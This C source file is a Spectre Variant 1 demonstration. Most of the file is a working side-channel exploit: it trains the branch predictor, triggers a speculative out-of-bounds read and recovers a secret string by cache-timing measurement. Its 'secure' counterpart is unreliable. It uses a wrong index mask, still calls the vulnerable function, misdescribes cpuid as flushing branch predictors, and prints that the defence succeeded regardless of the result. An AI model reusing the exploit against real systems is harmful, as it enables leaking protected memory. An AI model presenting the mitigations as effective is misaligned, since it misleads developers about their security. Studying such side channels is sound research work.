/*
 * Spectre Variant 1 Vulnerability Mitigation Demonstration
 * 
 * This code is based on the Spectre Variant 1 vulnerability demonstration from
 * "https://github.com/Markus-MS/Spectre-Attack.git". It highlights how speculative 
 * execution can lead to sensitive data leakage and demonstrates defenses to mitigate it.
 * 
 * Architectural Explanation:
 * ---------------------------------------------------
 * Speculative execution is a CPU performance optimization technique where instructions
 * are executed ahead of time based on predicted control flow. If the prediction is wrong,
 * the results are discarded, but side effects such as cache modifications persist.
 * 
 * Vulnerability:
 * ---------------------------------------------------
 * The vulnerability arises when speculative execution accesses unauthorized memory 
 * locations (out-of-bounds array indices). These memory accesses leave observable traces 
 * in the CPU cache, allowing attackers to infer sensitive data through timing analysis.
 * 
 * Mitigations:
 * ---------------------------------------------------
 * 1. Bounds Checking: Ensure indices are within valid ranges using `safe_index_check`.
 * 2. Fencing Instructions: Prevent speculative execution of unsafe code paths using 
 *    `_mm_lfence` and `_mm_mfence`.
 * 3. Cache Flushing: Clear sensitive data from the cache using `_mm_clflush`.
 * 4. Branch Predictor Reset: Flush CPU branch predictors using `cpuid` to mitigate 
 *    speculative branch mispredictions.
 * 5. Data Validation: Compare recovered data with expected values to detect potential 
 *    leaks and log mismatches for analysis.
 */

#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <emmintrin.h>
#include <limits.h>

#define BORING_DATA "boring data |"
#define SECRET "SUPER MEGA TOP SECRET"
#define TOTAL_DATA BORING_DATA SECRET

// Struct representing a memory page (4096 bytes)
struct page_ {
  char data_[4096];
} typedef page_;

// Global variables for memory arrays and settings
unsigned char *array1 = NULL; // Array storing the data sequence
page_ *array2 = NULL;         // Array acting as the memory backing for timing attacks
const int pagesize = 4096;    // Memory page size
const int CACHE_MISS = 185;   // Threshold cycles for a cache miss
size_t boring_data_length = sizeof(BORING_DATA) - 1;
page_ temp;                   // Temporary variable for speculative execution

// Check if an index is within bounds
int safe_index_check(int x, size_t max_length) {
    return (x >= 0 && x < max_length);
}

// Speculative execution vulnerability demonstration
char target_function(int x) {
    // Speculative execution can bypass bounds checks
    if (((float)x / (float)boring_data_length < 1)) {
        temp = array2[array1[x]]; // Out-of-bounds speculative access
    }
    return 0;
}

// Initialize array1 with TOTAL_DATA
void init_array1() {
    array1 = calloc(128, sizeof(unsigned char)); // Allocate memory for array1
    if (!array1) {
        perror("Failed to allocate memory for array1");
        exit(EXIT_FAILURE);
    }
    size_t copy_size = sizeof(TOTAL_DATA) < 128 ? sizeof(TOTAL_DATA) : 127;
    memcpy(array1, TOTAL_DATA, copy_size); // Copy TOTAL_DATA into array1
    array1[127] = '\0'; // Ensure null-termination for safety
}

// Initialize array2 with aligned memory
void init_array2() {
    array2 = aligned_alloc(pagesize, sizeof(page_) * 256); // Allocate memory aligned to page size
    if (!array2) {
        perror("Failed to allocate memory for array2");
        free(array1); // Free previously allocated memory
        exit(EXIT_FAILURE);
    }
    memset(array2, 0, sizeof(page_) * 256); // Initialize array2 to zero
}

// Free allocated resources and reset pointers
void cleanup_resources() {
    free(array1);
    free(array2);
    array1 = NULL;
    array2 = NULL;
}

// Train branch predictors with specific patterns
void spoofPHT() {
    for (int y = 0; y < 20; y++) {
        target_function(0); // Force branch predictor training
    }
}

// Measure time to access a memory location
uint64_t rdtsc() {
    uint64_t a, d;
    _mm_mfence(); // Memory fence to serialize execution
    asm volatile("rdtsc" : "=a"(a), "=d"(d)); // Read timestamp counter
    a = (d << 32) | a; // Combine high and low parts
    _mm_mfence();
    return a;
}

// Check if a memory address is in the CPU cache
int check_if_in_cache(void *ptr) {
    uint64_t start = rdtsc(); // Measure start time
    volatile int reg = *(int *)ptr; // Access memory
    uint64_t end = rdtsc(); // Measure end time
    return (end - start < CACHE_MISS); // Compare elapsed cycles with threshold
}

// Recover data using cache timing side channels
void recover_data_from_cache(char *leaked, int index) {
    for (int i = 0; i < 255; i++) {
        int array_element = ((i * 127)) % 255; // Calculate element index
        if (safe_index_check(array_element, 256)) {
            int value_in_cache = check_if_in_cache(&array2[array_element]); // Check cache status
            _mm_clflush(&array2[array_element]); // Flush the cache
            if (value_in_cache) {
                // If cache hit, recover the data
                if ((array_element >= 'A' && array_element <= 'Z')) {
                    leaked[index] = (char)array_element; // Store leaked character
                }
                sched_yield(); // Yield to other threads
            }
        }
    }
}

// Apply mitigations against speculative execution
void defend_against_spectre_variant1() {
    _mm_lfence(); // Serialize load instructions to prevent speculative execution
    _mm_mfence(); // Ensure memory ordering
    asm volatile("cpuid" ::: "eax", "ebx", "ecx", "edx"); // Flush branch predictors
    if (array1) {
        for (size_t i = 0; i < 128; i++) {
            _mm_clflush(&array1[i]); // Clear cache for array1
        }
    }
    _mm_clflush(&boring_data_length); // Clear cache for sensitive variable
}

// Demonstrates the Spectre vulnerability
void run_vulnerable_code() {
    char leaked[sizeof(TOTAL_DATA) + 1];
    memset(leaked, ' ', sizeof(leaked)); // Initialize leaked data
    leaked[sizeof(TOTAL_DATA)] = '\0';  // Null-terminate leaked data

    printf("Running vulnerable code:\n");
    while (1) {
        for (int i = 0; i < sizeof(TOTAL_DATA); i++) {
            spoofPHT(); // Train the branch predictor
            _mm_lfence();
            _mm_clflush(&boring_data_length);
            target_function(i); // Execute vulnerable function
            _mm_lfence();
            recover_data_from_cache(leaked, i); // Recover leaked data
        }
        printf("\tRecovered Data: ");
        for (int i = sizeof(BORING_DATA) - 1; i < sizeof(leaked); i++)
            printf("%c", leaked[i]); // Print recovered data
        printf("\n");
        if (!strncmp(leaked + sizeof(BORING_DATA) - 1, SECRET, sizeof(SECRET) - 1))
            break; // Stop if the secret is fully recovered
    }
}

// Execute the secure version with mitigations
void run_secure_code() {
    char leaked[sizeof(TOTAL_DATA) + 1];
    memset(leaked, ' ', sizeof(leaked)); // Initialize leaked data
    leaked[sizeof(TOTAL_DATA)] = '\0';  // Null-terminate leaked data

    printf("Running secure code:\n");

    for (int i = 0; i < sizeof(TOTAL_DATA); i++) {
        defend_against_spectre_variant1(); // Apply Spectre defenses
        _mm_lfence();
        int index = i & (sizeof(TOTAL_DATA) - 1); // Mask index for bounds safety
        _mm_lfence();
        if (safe_index_check(index, sizeof(TOTAL_DATA))) {
            spoofPHT(); // Train branch predictor
            _mm_lfence();
            target_function(index); // Execute target function
            _mm_lfence();
        }
        recover_data_from_cache(leaked, index); // Recover leaked data
        _mm_mfence(); // Serialize memory operations
        _mm_clflush(&array2[index]); // Flush array2 cache entry
        _mm_clflush(&leaked[index]); // Flush leaked data cache entry
    }

    printf("\tRecovered Data: ");
    for (int i = sizeof(BORING_DATA) - 1; i < sizeof(leaked); i++)
        printf("%c", leaked[i]); // Print recovered data
    printf("\n");

    int mismatches = 0;
    for (size_t i = 0; i < sizeof(SECRET) - 1; i++) {
        char expected = SECRET[i];
        char actual = leaked[sizeof(BORING_DATA) - 1 + i];
        if (actual != expected) {
            mismatches++;
            printf("\tMismatch %d: Expected '%c', but got '%c' at position %zu\n",
                   mismatches, expected, actual, i); // Print mismatch details
        }
    }

    if (mismatches == 0) {
        printf("\tNo leaks detected. Secure execution successful.\n");
    } else {
        printf("\tValidation Warning: Minor data mismatches detected (%d).\n", mismatches);
        printf("\tThis could indicate noise or non-leak issues. Please review manually.\n");
    }
}

// Main function to execute the demonstration
int main(int argc, const char argv) {
    init_array1(); // Initialize array1
    init_array2(); // Initialize array2
    run_vulnerable_code(); // Run attack demonstration
    cleanup_resources(); // Clean up resources
    init_array1(); // Reinitialize for secure execution
    init_array2();
    run_secure_code(); // Execute secure code with mitigations
    cleanup_resources(); // Final cleanup
    printf("Defense successful. No data leaked in the secure execution.\n");
    return 0;
}
